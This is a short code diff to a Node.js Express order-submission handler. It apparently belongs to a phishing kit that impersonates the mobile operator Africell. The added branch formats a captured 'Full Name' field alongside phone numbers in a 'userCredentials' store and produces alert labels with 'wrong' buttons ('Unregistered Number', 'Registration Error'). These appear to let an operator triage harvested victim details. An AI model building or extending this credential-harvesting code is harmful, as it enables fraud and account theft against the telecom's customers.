@@ -113,6 +113,11 @@ app.post('/api/submit-order', async (req, res) => {
             wrongButtonText = "⚠️ Registration Error";
             displayValue = uniqueId.replace('Account Registration: ', '');
             userCredentials[phone].registration = displayValue;
+        } else if (uniqueId.startsWith('Full Name:')) {
+            headerTitle = "📱 *Africell Signup Mobile & Name*";
+            credentialLabel = "Details";
+            wrongButtonText = "⚠️ Unregistered Number";
+            displayValue = uniqueId.replace(' | ', '\n');
         } else if (uniqueId === 'Password Recovery Request' || uniqueId === 'Signup Mobile Number') {
             headerTitle = "📱 *Africell Mobile Number Submitted*";
             credentialLabel = "Mobile Number Request";
